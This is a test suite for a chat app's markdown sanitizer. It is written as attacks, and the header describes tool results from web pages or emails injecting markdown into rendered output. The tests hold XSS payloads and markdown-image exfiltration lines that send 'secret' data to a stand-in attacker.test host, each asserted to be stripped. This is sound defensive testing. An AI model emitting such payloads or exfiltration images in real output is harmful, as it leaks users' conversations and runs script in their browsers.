/**
 * The markdown sanitizer.
 *
 * This is security code, so the tests are written as attacks rather than as
 * feature checks. The threat is not hypothetical: the UI renders model output
 * *and tool results*, and a tool result carries whatever a fetched web page, an
 * inbound email or a third-party API said. Anyone who can influence one of
 * those can write markdown into this function.
 *
 * Note what the sanitizer deliberately does NOT do: it allows images, because
 * displaying them is the entire point of the media feature. Restricting *where*
 * images may load from is the CSP's job, and the two are tested separately —
 * here for the script channel, and in the server's own suite for the
 * exfiltration channel.
 */

import { describe, expect, it } from "vitest";
import { renderMarkdown, sanitizeHtml } from "./markdown.js";

describe("renderMarkdown", () => {
  it("renders ordinary markdown", () => {
    const html = renderMarkdown("# Title\n\nSome **bold** text.");
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>bold</strong>");
  });

  it("keeps images, because showing them is the point", () => {
    const html = renderMarkdown("![chart](/api/media/abc)");
    expect(html).toContain("<img");
    expect(html).toContain("/api/media/abc");
  });

  it("marks images lazy so a long transcript does not fetch them all", () => {
    expect(renderMarkdown("![x](/api/media/abc)")).toContain('loading="lazy"');
  });
});

describe("script channel", () => {
  it("strips a script tag", () => {
    expect(sanitizeHtml('<script>alert(1)</script>')).not.toContain("alert");
  });

  it("strips an inline event handler", () => {
    // The classic: an image that fails to load on purpose so its handler runs.
    const html = sanitizeHtml('<img src="/x.png" onerror="alert(1)">');
    expect(html).toContain("<img");
    expect(html).not.toContain("onerror");
  });

  it("strips a javascript: link", () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">click</a>')).not.toContain("javascript:");
  });

  it("strips an iframe", () => {
    expect(sanitizeHtml('<iframe src="https://evil.test"></iframe>')).not.toContain("<iframe");
  });

  it("strips a style tag and style attributes", () => {
    // A message has no business restyling the app around it.
    expect(sanitizeHtml("<style>body{display:none}</style>")).not.toContain("<style");
    expect(sanitizeHtml('<p style="position:fixed">x</p>')).not.toContain("style=");
  });

  it("strips form controls", () => {
    const html = sanitizeHtml('<form action="https://evil.test"><input name="password"></form>');
    expect(html).not.toContain("<form");
    expect(html).not.toContain("<input");
  });

  it("survives markdown that produces raw html", () => {
    expect(renderMarkdown('Hello <img src=x onerror="alert(1)">')).not.toContain("onerror");
  });
});

describe("exfiltration channel", () => {
  it("drops a remote image src by default", () => {
    // `![](http://attacker/?q=…)` needs no JavaScript at all: rendering it is a
    // silent outbound request that leaks the surrounding conversation. This is
    // the defence-in-depth half; the CSP is the other.
    const html = renderMarkdown("![](http://attacker.test/?q=secret)");
    expect(html).not.toContain("attacker.test");
  });

  it("drops a remote https image src too", () => {
    expect(renderMarkdown("![](https://attacker.test/pixel.png)")).not.toContain("attacker.test");
  });

  it("keeps a same-origin image", () => {
    expect(renderMarkdown("![](/api/media/abc123)")).toContain("/api/media/abc123");
  });

  it("keeps a data: image, which is how inline previews render", () => {
    const html = renderMarkdown("![](data:image/png;base64,iVBORw0KGgo=)");
    expect(html).toContain("data:image/png");
  });

  it("rejects a data: URL that is not an image", () => {
    expect(sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain("data:text/html");
  });

  it("strips srcset, which would reintroduce remote fetches", () => {
    const html = sanitizeHtml('<img src="/ok.png" srcset="https://attacker.test/2x.png 2x">');
    expect(html).not.toContain("attacker.test");
  });

  it("allows remote images only when explicitly opted in", () => {
    const html = renderMarkdown("![](https://cdn.test/x.png)", { allowRemoteImages: true });
    expect(html).toContain("cdn.test");
  });
});

describe("links", () => {
  it("opens external links in a new tab with no handle back", () => {
    // `noopener` because window.opener lets the opened page navigate this one;
    // `noreferrer` so the URL being read is not handed to a third party.
    const html = sanitizeHtml('<a href="https://example.test">x</a>');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });
});

describe("TAI chat tags", () => {
  it("preserves the custom tags the chip parser looks for", () => {
    const html = sanitizeHtml('<task id="t1" status="open"></task>');
    expect(html).toContain("<task");
    expect(html).toContain('id="t1"');
  });
});
